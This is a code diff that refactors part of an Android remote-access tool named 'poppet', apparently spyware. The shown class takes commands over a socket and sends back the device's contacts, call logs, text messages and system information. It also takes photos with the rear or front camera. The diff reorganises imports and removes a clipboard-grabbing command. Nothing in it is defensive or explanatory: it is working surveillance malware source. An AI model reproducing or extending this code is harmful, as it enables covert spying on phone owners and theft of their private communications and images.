@@ -1,20 +1,29 @@
- package com.poppet.poppetx;
+ package com.poppet.network;
 
-import android.app.Activity;
-import android.content.Context;
-import android.hardware.Camera;
-import android.os.AsyncTask;
-import android.util.Log;
+ import android.app.Activity;
+ import android.content.Context;
+ import android.hardware.Camera;
+ import android.os.AsyncTask;
+ import android.util.Log;
 
-import java.io.BufferedReader;
-import java.io.DataOutputStream;
-import java.io.IOException;
-import java.io.InputStreamReader;
-import java.io.OutputStream;
-import java.net.InetSocketAddress;
-import java.net.Socket;
+ import com.poppet.config.NetworkConfig;
 
-public class socketWork extends AsyncTask<Void, Void, Void> {
+ import java.io.BufferedReader;
+ import java.io.DataOutputStream;
+ import java.io.IOException;
+ import java.io.InputStreamReader;
+ import java.io.OutputStream;
+ import java.net.InetSocketAddress;
+ import java.net.Socket;
+
+ import static com.poppet.modules.calls.callLogs.getCallLogs;
+ import static com.poppet.modules.calls.getContacts.getContactNumbers;
+ import static com.poppet.modules.camera.takePhoto.takePhoto;
+ import static com.poppet.modules.info.sysInfo.getSystemInfo;
+ import static com.poppet.modules.messages.getMessages.getMessages;
+
+
+ public class socketWork extends AsyncTask<Void, Void, Void> {
     Activity activity;
     Context context;
 
@@ -50,26 +59,22 @@ public class socketWork extends AsyncTask<Void, Void, Void> {
                         break;
                     case "getContacts":
                         //TODO Handle the getContacts Runtime Permission check on android which crashes the thing
-                        out.write(modules.getContactNumbers(context).getBytes("UTF-8"));
+                        out.write(getContactNumbers(context).getBytes("UTF-8"));
                         break;
                     case "getCallLogs":
-                        out.write(modules.getCallLogs(context).getBytes("UTF-8"));
+                        out.write(getCallLogs(context).getBytes("UTF-8"));
                         break;
                     case "getSystemInfo":
-                        out.write(modules.getSystemInfo().getBytes("UTF-8"));
+                        out.write(getSystemInfo().getBytes("UTF-8"));
                         break;
                     case "getMessages":
-                        out.write(modules.getMessages(context).getBytes("UTF-8"));
-                        break;
-                    case "getClipBoardContent":
-                        //TODO Patch nullPointerException
-                        out.write(modules.getClipBoardContent(activity).getBytes("UTF-8"));
+                        out.write(getMessages(context).getBytes("UTF-8"));
                         break;
                     case "takePhoto":
-                        out.write(modules.takePhoto(Camera.CameraInfo.CAMERA_FACING_BACK , context, out).getBytes("UTF-8"));
+                        out.write(takePhoto(Camera.CameraInfo.CAMERA_FACING_BACK , context, out).getBytes("UTF-8"));
                         break;
                     case "takeSelfie":
-                        out.write(modules.takePhoto(Camera.CameraInfo.CAMERA_FACING_FRONT, context, out).getBytes("UTF-8"));
+                        out.write(takePhoto(Camera.CameraInfo.CAMERA_FACING_FRONT, context, out).getBytes("UTF-8"));
                         break;
                     default:
                         String badStuff = "Unable to understand you!";
